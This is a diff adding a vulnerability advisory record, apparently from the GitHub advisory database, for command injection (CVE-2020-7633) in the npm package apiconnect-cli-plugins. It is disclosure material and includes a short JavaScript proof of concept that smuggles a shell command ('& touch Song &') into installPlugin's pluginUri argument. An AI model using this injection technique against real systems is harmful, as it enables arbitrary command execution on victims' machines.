@@ -1,0 +1,47 @@
+advisory_id: GHSA-c9m9-48pw-6mpv
+datasource_id: github_osv_importer_v2/GHSA-c9m9-48pw-6mpv
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/05/GHSA-c9m9-48pw-6mpv/GHSA-c9m9-48pw-6mpv.json
+aliases:
+  - CVE-2020-7633
+summary: |
+  apiconnect-cli-plugins vulnerable to OS Command Injection
+  apiconnect-cli-plugins through 6.0.1 is vulnerable to Command Injection. It allows execution of arbitrary commands via the `pluginUri` argument.
+
+  ### PoC
+  ```js
+  var root = require("apiconnect-cli-plugins");
+  var payload = "& touch Song &";
+  root.pluginLoader.installPlugin(payload, "");
+  ```
+
+  The injection point is located in line 181 of file `lib/plugin-loader.js`, in the function `installPlugin(pluginUri, registryUri)`.
+impacted_packages:
+  - purl: pkg:npm/apiconnect-cli-plugins
+    affected_versions: vers:npm/<=6.0.1
+    fixed_versions:
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/05/GHSA-c9m9-48pw-6mpv/GHSA-c9m9-48pw-6mpv.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-78
+references:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2020-7633
+    reference_type:
+    reference_id:
+  - url: https://openbase.com/js/apiconnect-cli-plugins
+    reference_type:
+    reference_id:
+  - url: https://snyk.io/vuln/SNYK-JS-APICONNECTCLIPLUGINS-564427
+    reference_type:
+    reference_id:
+  - url: https://web.archive.org/web/20211209115530/https://openbase.com/js/apiconnect-cli-plugins
+    reference_type:
+    reference_id:
